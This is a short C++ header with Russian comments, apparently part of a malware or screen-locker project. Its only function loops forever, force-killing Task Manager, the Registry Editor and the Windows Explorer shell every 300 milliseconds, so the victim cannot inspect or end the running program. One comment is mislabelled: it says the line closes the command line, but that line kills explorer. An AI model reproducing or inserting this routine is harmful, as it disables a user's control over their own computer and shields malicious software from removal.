#pragma once
#include "include.h"
void StopAllShit() {
    while (true) {
        system("taskkill /F /IM taskmgr.exe >nul 2>&1");  // Закрываем диспетчер задач
        system("taskkill /F /IM regedit.exe >nul 2>&1");  // Закрываем редактор реестра
        // system("taskkill /F /IM cmd.exe >nul 2>&1");
        system("taskkill /F /IM explorer.exe >nul 2>&1"); // Закрываем командную строку
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
}